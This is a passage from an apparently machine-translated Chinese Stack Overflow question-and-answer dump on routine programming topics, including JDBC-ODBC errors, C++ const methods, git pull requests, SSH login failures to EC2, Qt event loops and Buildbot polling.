String QueryString = "SELECT Student_ID, Student_F_Name, Student_L_Name, Student_NIC, Student_Address, Student_DOB, Student_Email, Student_Gender, Course_Name, Batch_Name, Student_username, Student_password FROM Student WHERE Student_ID = ?";
Class.forName("sun.jdbc.odbc.JdbcOdbcDriver").newInstance();
Connection connection = DriverManager.getConnection("Jdbc:Odbc:UniversityDSN");
PreparedStatement statement=connection.prepareStatement(QueryString);
String stuid = session.getAttribute("studentid").toString();
statement.setString(1, stuid);
ResultSet rs = statement.executeQuery(); 
```

它将再次开始工作。但是一段时间后，这段代码将再次停止工作，给出相同的异常，我必须像以前一样修改它。但是在这两个时间里，如果我调试它，代码就可以完美地工作。这很烦人，因为我不得不浪费大量时间来修改我的代码，而且它发生在 JSP 页面、Servlet 或我使用的 Bean 类中。如果有人能建议我可能做错了什么以及如何避免这个问题，我将不胜感激？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T10:17:55.767

首先，java odbc驱动对于webservers和多线程环境不是很好。我真的认为这与你的错误有关。

它丢失了数据库连接引用。你无能为力。唯一的方法是使用适用于 MS SQL 的 JDBC 驱动程序，这是一个更好的 Web 环境驱动程序。

> INFO: SQLException:[Microsoft][ODBC Driver Manager] 无效的字符串或缓冲区长度

它有时也与数据库服务器的升级有关。
因为java odbc驱动的版本必须和db server版本匹配...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-09T03:55:59.653

我在使用外部连接器连接到 oracle 数据库时遇到了这个问题。这里的问题是 ODBC 驱动程序。我使用的是 Oracle 11G 并在源代码中创建了一个 DSN。Oracle 11G 所需的 JDBC-ODBC 驱动程序是 ojdbc5.jar。我更改了驱动程序，错误消失了。此错误主要与 64 位进程有关。

# android - 不同设备上蓝牙文件夹的不同路径

> ID：12068288
> 
> 赞同：0
> 
> 时间：2012-08-22T07:33:18.657
> 
> 标签：android, bluetooth

我的应用程序需要将一些文件从蓝牙文件夹传输到我的应用程序创建的另一个文件夹。问题是蓝牙文件夹位于不同设备上的不同路径。在我`Samsung galaxy S3`的路径上`/mnt/sdcard/Bluetooth`，当我在 a 上测试应用程序时，`Samsung galaxy S2`我什至**找不到**蓝牙文件夹！无论如何我可以在Java中以编程方式搜索或获取蓝牙文件夹吗？

这是我导航到三星 S3 上的蓝牙文件夹的代码：

```
File sdCard = Environment.getExternalStorageDirectory();
String bluetoothFile = sdCard.getAbsolutePath() + "/Bluetooth";
File bluetoothFolder = new File(bluetoothFile); 
```

并使用此`get`方法获取我的蓝牙文件夹的路径

```
public File getBluetoothFolder() {
    return bluetoothFolder;
} 
```

这仅适用于三星 S3，但是当我将应用程序上传到另一部手机时，这只会导致 a `NullPointerException`，因为蓝牙文件夹不在`/mnt/sdcard/Bluetooth`

# android - 相机拍摄的图像在图像视图中以横向模式显示？

> ID：12068295
> 
> 赞同：3
> 
> 时间：2012-08-22T07:33:35.330
> 
> 标签：android, bitmap, orientation, landscape

我目前正在研究图像处理应用程序。当我选择相机拍摄的图像时，它仅显示为横向模式，其他图像在 imageview 中正确显示。我该如何纠正这个......（注意：我没有使用相机，只是拍摄的图像）。

# node.js - 我应该对 RESTful Nodejs 应用程序使用 Express 还是 Connect

> ID：12068297
> 
> 赞同：5
> 
> 时间：2012-08-22T07:33:40.337
> 
> 标签：node.js, express, connect

我计划开发一个包含 30 个模块的复杂节点应用程序，这些模块将通过 REST 服务完全访问——主干是前端之一。我不确定是否应该使用 Express 或 Connect，因为该应用程序不使用任何视图。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-23T03:17:00.110

Express 为您提供 Connect 中的所有内容以及：

*   视图（您不需要）
*   路由（您可能确实需要），以及对路由中间件的支持
*   能够使用多种配置（例如生产与测试）
*   设置管理，方便将设置传递给不同的模块
*   用于提取信息的请求对象的便捷方法
*   响应对象上用于发送文件、设置 cookie、重定向等的便捷方法。

听起来您会特别受益于路由、配置和设置。您可能想研究 restify 作为替代方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:44:00.130

Express 建立在 Connect 之上，并以更友好的方式公开了它的许多功能。您将从 Express 中获得的一个主要功能是内置路由器（包含特定于路由的中间件、错误处理等）；但是，如果您对推出自己的路由解决方案感到满意并且不需要 Express 提供的其他功能，则可以在 Connect 本身上进行构建。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:39:45.680

这篇文章部分回答了你的问题

[什么是 Node.js 的 Connect、Express 和“中间件”？](https://stackoverflow.com/questions/5284340/what-is-node-js-connect-express-and-middleware)

现在关于 node.js 中的 REST 服务，您可能想阅读这篇关于使用 Express 构建 REST API 的博客文章。MongoDB 和骨干网。

[http://pixelhandler.com/blog/2012/02/09/develop-a-restful-api-using-node-js-with-express-and-mongoose/](http://pixelhandler.com/blog/2012/02/09/develop-a-restful-api-using-node-js-with-express-and-mongoose/)

祝你好运！

# jenkins - 詹金斯，可以在一台机器上运行并行构建吗？

> ID：12068299
> 
> 赞同：2
> 
> 时间：2012-08-22T07:33:45.613
> 
> 标签：jenkins

我目前只有一台可以用来运行 Jenkins 的机器（物理的，未虚拟化的）。我想知道，在不创建虚拟化主从环境的情况下，是否可以让 Jenkins 只用一台机器执行多个构建/测试/部署等？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:48:36.463

是的，您可以设置同时运行多少个执行程序。您可以在 Jenkins > Configure System > # of executors 中更改此设置。

# c++ - c++错误C2662无法将'this'指针从'const Type'转换为'Type &'

> ID：12068301
> 
> 赞同：30
> 
> 时间：2012-08-22T07:33:46.863
> 
> 标签：c++, operator-overloading, syntax-error, friend-function

我正在尝试重载 c++ operator== 但我遇到了一些错误...

错误 C2662：“CombatEvent::getType”：无法将“this”指针从“const CombatEvent”转换为“CombatEvent &”

这个错误在这一行

```
if (lhs.getType() == rhs.getType()) 
```

见下面的代码：

```
class CombatEvent {

public:
    CombatEvent(void);
    ~CombatEvent(void);

    enum CombatEventType {
        AttackingType,
        ...
        LowResourcesType
    };

    CombatEventType getType();
    BaseAgent* getAgent();

    friend bool operator<(const CombatEvent& lhs, const CombatEvent& rhs) {

        if (lhs.getType() == rhs.getType())
            return true;

        return false;
    }

    friend bool operator==(const CombatEvent& lhs, const CombatEvent& rhs) {

        if (lhs.getType() == rhs.getType())
            return true;

        return false;
    }

private: 
    UnitType unitType;
} 
```

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2012-08-22T07:36:44.657

```
CombatEventType getType(); 
```

需要是

```
CombatEventType getType() const; 
```

您的编译器正在抱怨，因为该函数被赋予了一个`const`您试图在其上调用非`const`函数的对象。当一个函数获取一个`const`对象时，对它的所有调用都必须在`const`整个函数中进行（否则编译器无法确定它没有被修改）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-22T07:36:54.183

将声明更改为：

```
CombatEventType getType() const; 
```

您只能通过对 const 的引用来调用“const”成员。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-22T07:46:33.280

这是一个 const 问题，您的 getType 方法未定义为 const 但您的重载运算符参数是。因为 getType 方法不能保证它不会更改类数据，所以编译器会抛出错误，因为您无法更改 const 参数；

最简单的更改是将 getType 方法更改为

```
CombatEventType getType() const; 
```

当然，除非该方法实际上正在更改对象。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-05-13T16:01:03.683

我用类似的代码看到了这个错误

```
 get_color(const std::unsigned_integral auto &x,
              const std::unsigned_integral auto &y,
              const BPPT &                       depth,
              const std::unsigned_integral auto &palette    = 0U,
              const std::unsigned_integral auto &texture_id = 0U) const 
```

当我更改为模板时，它起作用了。

```
 template<std::unsigned_integral xT,
           std::unsigned_integral yT,
           std::unsigned_integral paletteT,
           std::unsigned_integral texture_idT>
  [[nodiscard]] Color16
    get_color(const xT          x,
              const yT          y,
              const BPPT        depth,
              const paletteT    palette    = 0U,
              const texture_idT texture_id = 0U) const 
```

# git - git 为公共存储库做出贡献

> ID：12068302
> 
> 赞同：1
> 
> 时间：2012-08-22T07:33:54.323
> 
> 标签：git, repository, pull

我有一种情况，客户将他的 git 存储库设置为公共存储库。我所做的工作，我需要作为拉取请求提交到他的存储库。

然后他可以转到 github 存储库并查看我发送的那些拉取请求并接受拉取请求。这样我所做的给定更改就会提交到他的存储库。

这如何在 git 中完成？

我曾尝试在我的机器上克隆他的存储库，然后当我执行 git push 时它不起作用。我怎样才能将我的更改推送到他的存储库，以便他可以从他的末端拉出来？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:46:50.230

公共存储库并不意味着每个人都具有对存储库的推送访问权限 - 仅选择用户 - 听起来您不是其中之一。

要使用 github 工作流的“拉取请求”风格，您需要做的是在 github 中*分叉*客户端存储库。然后，您通过将更改推送到 github 中的 repo 分支来工作。当您为客户准备好东西时，您可以访问他的存储库的网页以提交拉取请求。（你也可以从你的 fork 页面做到这一点，不记得了）。

然后他们将接受拉取请求（或不接受），您的更改将被复制到原始存储库中。

[您可以在此处](https://help.github.com/articles/using-pull-requests)找到此工作流程（带有图像）的一个很好的概述。

# php - 基于公钥/私钥的许可

> ID：12068303
> 
> 赞同：1
> 
> 时间：2012-08-22T07:34:05.177
> 
> 标签：php, aes, rsa, delphi-xe2, public-key-encryption

我想向我的 Delphi 应用程序添加许可。

这是我想到的流程：-

1.  当程序运行且未获得许可/激活时，用户会看到许可屏幕。

2.  他点击导出，这将导出一个包含用户机器硬件信息的文件。该文件将使用公钥 (A) 加密。（用于此的私钥将在 Web 应用程序中可用）

3.  用户将此文件上传到我的网络应用程序，这反过来将允许用户下载他的许可证文件。许可证文件将基于用户的硬件信息（MAC ID、CPU 序列号等）。该文件将使用另一个公钥 (B) 进行加密。（它的私钥将在 Delphi 应用程序中可用）

4.  用户将此许可证文件导入他的 Delphi 应用程序以激活它。

*添加了导入/导出步骤，以防用户没有想要使用此应用程序的 Internet 连接*

为此，我正在探索 TurboPower LockBox 3。

我需要一些帮助来决定我的方法是否正确。

我应该在这种情况下使用对称加密吗？

我不希望整个事情太复杂。我可以接受中等水平的安全性。

请指导。

谢谢 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T11:01:57.743

您应该使用非对称密钥。不要忘记密钥需要在您的程序中才能使用。任何拥有十六进制编辑器的人都可能打开您的 exe 文件并查看您的密钥。

此外，应使用私钥而不是公钥对密钥文件进行加密。这样，只有您可以生成密钥。

我为我的应用程序做了类似的事情。我花了大约 2 天的时间来实施。

# ruby-on-rails - 使用 Redis 作为主要的 Rails 存储

> ID：12068304
> 
> 赞同：3
> 
> 时间：2012-08-22T07:34:13.757
> 
> 标签：ruby-on-rails, ruby-on-rails-3, nosql, redis

如何使用 Redis 作为 Rails 应用程序的主要数据存储，并省略 SQL 数据库？是否有一个 ORM / 适配器可以像 SQL 适配器 / ActiveRecord 一样无缝地将 Rails 模型转换为 Redis 对象？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-27T16:56:54.850

我还没有找到 RDB 的一对一 Redis Active-Record 替代品。相反，您最好的选择是使用[redis-rb gem](https://github.com/redis/redis-rb)。

[这提供了一个可靠的界面，可以非常直接地映射到他们网站](http://redis.io/commands)上存在的实际 redis 命令。尽管您失去了许多内置于 rails 的回调，但通过一些工作，您可以自己创建一个类似的自定义框架。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T13:53:44.397

检查此[链接](http://jimneath.org/2011/03/24/using-redis-with-ruby-on-rails.html#redis_and_rails)。向下导航到 rails 中使用的示例。他们谈论 ActiveRecord 和 Rails....不是 Rails 开发人员，所以不确定这是否真的像使用 RDBMS 一样映射到 ActiveRecord。

--S

# php - 父母、孩子、递归列表和方法结构

> ID：12068310
> 
> 赞同：0
> 
> 时间：2012-08-22T07:34:33.350
> 
> 标签：php, oop, recursion

**我的目标是显示从X 人**开始并显示所有后代的家谱。无需显示兄弟姐妹、父母或其他祖先。

为此我有一`person`堂课。

我还有一个带有`person_ID`和`parent_ID`列的数据库表。

创建`person`类时，您将所需的人员 ID 传递给它，然后它将从该表中预加载其父 ID 和子 ID。

为了创建后代树，我在`person`类中编写了以下方法：

```
public function loadChildren() {
    foreach ($this->_ChildIDs as $curChildID) {
        $child = new Person();
        $child->loadSelfFromID($curChildID);
        $child->loadChildren();
        $this->_Children[] = $child;
    }
} 
```

这成功地递归地加载了整个后代树。

到现在为止还挺好。

为了将此数据显示为嵌套的 HTML 列表，我编写了以下独立函数：

```
function recursivePrint($array) {
    echo '<ul>';
    foreach ($array as $child) {
        echo '<li>'.$child->getName();
        recursivePrint($child->getChildren());
        echo '</li>';
    }
    echo '</ul>';
} 
```

最终脚本如下所示：

```
$c = new Person();
$c->loadSelfFromID('1');
$c->loadChildren(); // recursively loads all descendants
$descendants = $c->getChildren();
recursivePrint($descendants);

//Output is as expected. 
```

我的问题是：**我在哪里坚持那个独立的功能？**

它是否只是被扔进了一个随机实用程序，包括那些实际上并没有去其他任何地方的功能？它应该进入`person`课堂吗？它应该进入一个`FamilyTree`只制作树的类吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:46:51.017

您可以利用[复合设计模式](http://sourcemaking.com/design_patterns/composite)。

这是另一个资源：[http ://devzone.zend.com/364/php-patterns_the-composite-pattern/](http://devzone.zend.com/364/php-patterns_the-composite-pattern/)

**编辑**

```
class Person
{
    public $name;
    protected $_descendants = null;

    public function __construct($name)
    {
        $this->name = $name;
        $this->_descendants = array();
    }

    public function addDescendant(Person $descendant)
    {
        $i = array_search($descendant, $this->_descendants, true);

        if($i === false){
            $this->_descendants[] = $descendant;
        }
    }

    public function toString()
    {
        $str = $this->name;
        if(count($this->_descendants) > 0){

            $str .= PHP_EOL . '<ul>' . PHP_EOL;

            foreach($this->_descendants as $descendant){
                $str .= '<li>' .  $descendant->toString() . '</li>' . PHP_EOL;
            }
            $str .= '</ul>' . PHP_EOL;

        }
        return $str;
    }
}

$dad = new Person('Dad');
$dad->addDescendant(new Person('Big sister'));
$dad->addDescendant(new Person('Big brother'));
$dad->addDescendant(new Person('Little brat'));

$grandMa = new Person('GrandMa');

$grandMa->addDescendant($dad);

echo $grandMa->toString(); 
```

# tridion - 如何在 SDL tridion 网站中实施 Google Analytics？

> ID：12068311
> 
> 赞同：4
> 
> 时间：2012-08-22T07:34:33.363
> 
> 标签：tridion, tridion-2011

我的选择：

1.  在页面模板或 CT 中包含分析代码。

2.  创建一个包含解析代码的组件并将其呈现在页面的 Comonent 呈现中。

这可能会更好，或者请提出任何其他出路。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-22T07:48:41.483

第一种方法通常更可取，因为它允许您在调用 Google Analytics 时包含有关组件或页面的信息。而且您甚至可能不必自己编写它，因为有一个名为 Web Analytics Enabler 的免费扩展程序，可[在此处](http://www.sdltridionworld.com/community/extension_overview/enabler_google_analytics.aspx)获得。我建议你先检查一下。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-25T08:16:19.950

对于您使用 SDL Tridion 添加的分析或任何标记，您需要确认内容模型、作者，并考虑内容和模板可能如何演变。

## 内容模型

假设所有页面都有一个实例，您可以将（[根据 Google](https://support.google.com/analytics/bin/answer.py?hl=en&answer=1008080)）添加到您的页面模板中：

```
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-XXXXX-Y']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script> 
```

## 作者

在这种情况下，作者将是开发人员。但是，如果您有 SEO 作者和多个出版物，请考虑通过模板添加脚本，但在组件字段中添加跟踪代码，在您的布局 TBB 中引用：

```
 _gaq.push(['_setAccount', '@@GoogleTrackingCode@@']); 
```

由您决定如何将 GoogleTrackingCode 添加到包中。根据需要调整您的渲染框架或模板方法。

## 变化

如果脚本格式可能经常更改（怀疑），请考虑脚本本身的组件字段。企业更有可能需要更详细的链接和活动类型跟踪。

## 更详细的跟踪

要为单个链接（[出站链接](https://support.google.com/analytics/bin/answer.py?hl=en&answer=1136920&topic=1136919&ctx=topic)）或[自定义跟踪](https://developers.google.com/analytics/devguides/collection/gajs/gaTrackingCustomVariables)添加跟踪代码，请放置在页面模板（用于非动态嵌入式组件演示）或 CT 中。请记住[，组件本身并不是唯一的](http://www.createandbreak.net/2013/01/sdl-tridion-and-web-analytics-aka-how.html)。

# c++ - 在 QDialog::exec() 之后调用 QApplication::exec()

> ID：12068317
> 
> 赞同：1
> 
> 时间：2012-08-22T07:35:03.537
> 
> 标签：c++, qt, user-interface

在 Qt 书中，有一个例子：

```
int main(int argc, char *argv[])  
{    
    QApplication app(argc,argv);  
    QDialog dialog;  
    dialog.show();  
    return app.exec();    
} 
```

它运行良好，但在下面稍作改动后：

```
int main(int argc, char *argv[])  
{    
    QApplication app(argc,argv);  
    QDialog dialog;  
    dialog.exec();  
    return app.exec();    
} 
```

当我点击对话框右上角的关闭按钮时，对话框窗口消失但程序仍在运行

dialog.exec() 和 app.exec() 有什么区别？我可以简单地使用 dialog.exec() 然后返回 0 还是会导致什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T08:00:12.527

`exec`QDialog、QMenu、QCoreApplication的方法运行一个事件循环。事件循环是无限的。

所以 QApplication 事件循环应该是第一个被启动的。在大多数情况下，您应该使用 QDialog::show() 或 QDialog::open() 而不是 QDialog::exec()。

换句话说，您有以下代码：

```
while (1) // QDialog::exec
{
    // Close event  
}

while (1) // QApplication::exec
{
    // There are no events
} 
```

# android - 支持android、ios和黑莓操作系统的默认字体列表

> ID：12068319
> 
> 赞同：7
> 
> 时间：2012-08-22T07:35:08.373
> 
> 标签：android, ios, fonts, blackberry-jde

**设想**

我们是一群开发安卓、黑莓和ios操作系统应用程序的朋友，我们需要在我们的应用程序中实现字体家族的变化。

我需要的：

是否有所有三个操作系统都支持的通用字体列表？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-12-06T12:53:48.437

**iOS：**以下是 iOS 支持的默认字体列表：http: [//iosfonts.com/](http://iosfonts.com/)

**Android：Android**中只有三种系统宽字体；普通（Droid Sans）、衬线（Droid Serif）和等宽（Droid Sans Mono）。资料来源：[http ://wiki.mobileread.com/wiki/List_of_fonts_included_with_each_device](http://wiki.mobileread.com/wiki/List_of_fonts_included_with_each_device)

**黑莓： http:** [//supportforums.blackberry.com/t5/Adobe-AIR-Development/List-of-available-fonts/td-p/1243913](http://supportforums.blackberry.com/t5/Adobe-AIR-Development/List-of-available-fonts/td-p/1243913)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T08:02:40.973

不，是的。

如果你有字体，你可以在 Android 上显示任何字体，但默认的 Android 只有roboto 字体。

iOS 至少有 helvetica 系列字体，我相信它也支持自定义字体（如果我错了，请纠正我）。

**编辑**：我相信没有在所有平台上都支持的内置字体，但是所有平台都支持自定义字体，所以你应该选择一个并使用它。

对于 iOS 自定义字体，请参见此处：[我可以在 iPhone 应用程序中嵌入自定义字体吗？](https://stackoverflow.com/questions/360751/can-i-embed-a-custom-font-in-an-iphone-application)

对于 Android 自定义字体，请参见此处：Android[中的自定义字体](https://stackoverflow.com/questions/3203694/custom-fonts-in-android)

对于黑莓自定义字体，请看这里：[在黑莓中设置多种字体](https://stackoverflow.com/questions/11309855/to-set-multiple-fonts-in-blackberry)

希望澄清一点

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-22T10:08:42.183

抱歉，这是不可能的，但支持 sans 和 serif 的 android 和 blackberry，blackberry 和 ios 支持 Arial

# sql - 如何在sp中的查询子句中传递参数？

> ID：12068322
> 
> 赞同：0
> 
> 时间：2012-08-22T07:35:11.883
> 
> 标签：sql

```
Select * from table1 where name = 'sam' 
```

这里`name = 'sam'`是静态部分。动态部分是表名。如何将表名作为输入参数传递给 sp。

```
Create Procedure Proc_sp1
(
 @table varchar(10)
)
as
 Select * from @table where name = 'sam' 
```

我知道，需要在查询中使用`sp_executesqland`use 。`'+@table+'`除了 有什么选择`sp_executesql`吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:57:09.587

如果您有特定的表集，则可以传递参数并使用“if-else”条件，该表将用于选择：

伪：

```
IF @TableName = 'TableA'
BEGIN
    SELECT * FROM TableA WHERE ....
END
ELSE IF @TableName = 'TableB'
BEIN
    SELECT * FROM TableA WHERE ....
END 
```

# ssh - ssh-ing 到 ec2 实例时的问题

> ID：12068331
> 
> 赞同：1
> 
> 时间：2012-08-22T07:35:46.563
> 
> 标签：ssh, amazon-ec2

我收到以下错误：

```
ssh -v -i ~/.ssh/shopious.pem ubuntu@54.245.124.178

OpenSSH_5.9p1, OpenSSL 0.9.8r 8 Feb 2011
debug1: Reading configuration data /etc/ssh_config
debug1: /etc/ssh_config line 20: Applying options for *
debug1: Connecting to 54.245.124.178 [54.245.124.178] port 22.
debug1: Connection established.
debug1: identity file /Users/aditya15417/.ssh/shopious.pem type -1
debug1: identity file /Users/aditya15417/.ssh/shopious.pem-cert type -1
debug1: Remote protocol version 2.0, remote software version OpenSSH_5.9p1 Debian-5ubuntu1
debug1: match: OpenSSH_5.9p1 Debian-5ubuntu1 pat OpenSSH*
debug1: Enabling compatibility mode for protocol 2.0
debug1: Local version string SSH-2.0-OpenSSH_5.9
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: server->client aes128-ctr hmac-md5 none
debug1: kex: client->server aes128-ctr hmac-md5 none
debug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024<1024<8192) sent
debug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP
debug1: SSH2_MSG_KEX_DH_GEX_INIT sent
debug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY
debug1: Server host key: RSA 66:b7:fd:11:91:1b:bd:a2:b0:58:48:5d:b9:3b:e1:14
debug1: Host '54.245.124.178' is known and matches the RSA host key.
debug1: Found key in /Users/aditya15417/.ssh/known_hosts:12
debug1: ssh_rsa_verify: signature correct
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: Roaming not allowed by server
debug1: SSH2_MSG_SERVICE_REQUEST sent
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey
debug1: Next authentication method: publickey
debug1: Offering RSA public key: /Users/aditya15417/.ssh/id_rsa
debug1: Authentications that can continue: publickey
debug1: Trying private key: /Users/aditya15417/.ssh/shopious.pem
debug1: read PEM private key done: type RSA
debug1: Authentications that can continue: publickey
debug1: No more authentication methods to try. 
```

该命令曾经有效，但现在不再有效。知道为什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T16:12:00.330

将您的 .pem 文件移动到主文件夹或除 .ssh 之外的任何其他位置。我希望它与系统的私钥冲突。还要从 .ssh 文件夹中删除 known_hosts 文件，并确保您已运行 chmod 400 shopious.pem 以便它不应具有写入或执行权限。如果它不起作用，请告诉我

# sandbox - 在 Sharepoint office 365 中激活沙盒解决方案

> ID：12068333
> 
> 赞同：3
> 
> 时间：2012-08-22T07:35:58.797
> 
> 标签：sandbox, office365

好吧，到目前为止我已经尝试过了。

```
ClientOM.List list = clientContext.Site.GetCatalog((int)ClientOM.ListTemplateType.SolutionCatalog);
        clientContext.Load(list);
        clientContext.ExecuteQuery();

        ClientOM.ListItemCollection listItemColls = list.GetItems(new ClientOM.CamlQuery());
        clientContext.Load(listItemColls, listItem => listItem.Include(item => item.DisplayName, item => item["Status"]).Where(i => i.DisplayName == "Tzunami Office 365 Sandbox Package"));
        clientContext.ExecuteQuery(); 
```

然后我阅读了沙盒解决方案的状态。它给出了沙盒解决方案的状态，即当 wsp 文件未激活时 listItemColls[0]["Status"] 等于 null。

如果未激活，我想激活该解决方案。我该怎么做？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-19T12:57:01.310

我花了一些时间研究这个问题，我不相信有任何程序访问来激活 SharePoint Online 中的沙盒解决方案。

您可以以编程方式将解决方案上传到库中，并且可以激活功能，但所有受支持的 API（客户端 OM、沙盒代码、Web 服务）都不包含激活解决方案的功能。

我个人觉得这有点令人失望，因为这是将自定义的复杂自动化部署构建到 SharePoint Online 中的一个缺失步骤。

您可以做的最好的事情（这将完全不受支持并且可能在未来的任何时候中断）将模拟一个 Web 浏览器执行在 SharePoint Online 中进行身份验证的操作，打开解决方案库并单击相应的 UI激活解决方案的元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-20T09:15:37.040

我以其他方式做到了。我跟踪请求发送以通过提琴手激活沙盒。只需通过代码复制相同的过程

# java - Eclipse java build 包含 .java 和 .class 文件

> ID：12068341
> 
> 赞同：0
> 
> 时间：2012-08-22T07:36:25.903
> 
> 标签：java, eclipse

当我出于某种原因在 Eclipse 中构建我的 java 项目时，它会将类和 java 文件都放在构建中，这使得它的大小增加了一倍 如何关闭它？

编辑：未检查导出源（将是真正的 DOH 时刻！）在构建黑莓项目时没有这样的选项

Edit2：它发生在 2 个不同的 Eclipse 环境中，据我所知，它必须是某个地方的全局“设置”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T04:39:11.203

我有同样的问题，但我的同事很好，他使用的是旧版本的 Eclipse。现在，我必须使用 7zip 或其他 zip 管理器打开 war 文件并删除 java 源文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:10:04.960

当您将其导出为 WAR 文件时，有一个检查选项可以选择您是否也想导出源。取消选中它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:11:25.467

在 Eclipse 中导出到 war 文件时，有一个复选框，上面写着“导出源文件”。如果选中，它将导出 .java 文件，否则不会。默认情况下不选中。

# nunit - NUnit 的工作 ITestCaseProvider 实现示例？

> ID：12068342
> 
> 赞同：4
> 
> 时间：2012-08-22T07:36:27.520
> 
> 标签：nunit, nunit-addins

有没有人有任何 ITestCaseProvider 的工作示例？

我遇到的示例不会被任何测试运行拾取 - GUI、控制台或 Resharper（我已将程序集放在所有正确的位置）。

我已经将 Debugger.Break 添加到它们中，试图强制调试器启动，但到目前为止还没有。

我想我正在遵循分步指南，如果有人有一个，或者遇到一个。

谢谢，
基龙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-04T13:26:24.720

我让我的 ITestCase 提供程序在[此博客](https://www.simple-talk.com/dotnet/.net-tools/testing-times-ahead-extending-nunit/)中工作，并在此处删除我的程序集：

C:\Program Files (x86)\NUnit 2.6.3\bin\addins

不幸的是，它只适用于 nunit GUI。ReSharper (v8.2) 通过不加载它仍然很痛苦，即使我也将我的程序集放在这里：

C:\Program Files (x86)\JetBrains\ReSharper\v8.2\Bin\addins

希望看到一个具有更简单的扩展点和简单的 ReSharper 集成的测试框架。

# c# - 如何获取方法名称 win 8 app

> ID：12068355
> 
> 赞同：7
> 
> 时间：2012-08-22T07:37:02.770
> 
> 标签：c#, windows-8

如何在win 8（WinRT）应用程序中获取当前方法名称......在wp7早期我们可以使用`System.Reflection.MethodBase.GetCurrentMethod().Name`但它不再存在谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T07:44:28.687

是的，.NETCore 缺少很多这样的东西......甚至不要让我*开始*`GetTypeInfo()`！但也许一个务实的解决方法是让**编译器**为你做这件事？

```
string CallerName([CallerMemberName]string caller = "")
{
    return caller;
}
...
string name = CallerName(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T10:30:28.770

如果您需要覆盖方法，此选项会很有帮助

```
private string GetMethodName(Expression<Action> expression)
{
    var methodName = (expression.Body as MethodCallExpression).Method.Name;
    return methodName;
} 
```

然后就这样称呼它

```
GetMethodName(() => TheNameOfTheCallingMethod()); 
```

# git - Buildbot 遇到 GitPoller 问题

> ID：12068357
> 
> 赞同：4
> 
> 时间：2012-08-22T07:37:15.077
> 
> 标签：git, buildbot

我已经设置了 Buildbot，并且正在尝试运行 Gitpoller 来检查代码的更改。我在主机上的 twistd.log 中收到以下错误。

```
2012-08-22 17:10:50+1000 [-] http client disconnected before results were sent
2012-08-22 17:11:11+1000 [-] http client disconnected before results were sent
2012-08-22 17:11:21+1000 [-] gitpoller: polling git repo at <git repo censored>
2012-08-22 17:11:31+1000 [-] gitpoller: repo poll failed
2012-08-22 17:11:31+1000 [-] Unhandled Error
    Traceback (most recent call last):
    Failure: twisted.internet.utils._UnexpectedErrorOutput: got stderr: "fatal: ambiguous argument 'master..origin/master': unknown revision or path not in the working tree.\nUse '--' to separate paths from revisions\n"

2012-08-22 17:11:31+1000 [-] gitpoller: no changes, no catch_up 
```

我在主服务器和从服务器上设置了 SSH 密钥，并且都复制到了 Github。有人知道这可能是什么吗？

我正在运行最新版本的 Buildbot .8.6

多谢你们

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T16:58:32.850

好吧，您好，如果您尝试使用 SSH 使用 Buildbot 0.8.X 轮询 git repo，他们会遇到一些问题。你应该在他们的 TRAC[1] 上关注这个线程。

显然他们目前正在努力。

[1] [http://trac.buildbot.net/ticket/2343](http://trac.buildbot.net/ticket/2343)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-27T18:24:39.800

一个对我有用的解决方法是删除 gitpoller 工作目录（gitpoller-workdir），然后重新启动 buildbot，正如接受答案中链接的消息中所建议的那样。

# c++ - 指针、向量列表 = 混乱

> ID：12068359
> 
> 赞同：0
> 
> 时间：2012-08-22T07:37:35.097
> 
